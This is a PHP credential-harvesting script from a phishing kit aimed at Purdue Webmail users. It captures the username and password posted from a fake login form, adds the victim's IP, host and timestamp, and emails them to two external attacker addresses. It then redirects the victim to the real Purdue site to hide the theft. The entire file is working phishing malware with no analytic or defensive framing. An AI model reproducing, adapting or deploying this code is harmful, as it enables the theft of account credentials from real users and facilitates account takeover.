<?

$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$message .= "Username: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "\n";
$message .= "Date: ".$adddate."\n";
$message .= "Host: ".$host."\n";
$message .= "------------- Created By Arabcrew ---------------\n";
$recipient = "2016ismyyear1@gmail.com,moriyanu03@yandex.com";
$subject = "Purdue Webmail login - ".$_POST['username']."\n";
$from = "$ip";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$headers = "From: $from\r\n";
	 mail("$to", "$subject", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location:http://www.purdue.edu");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>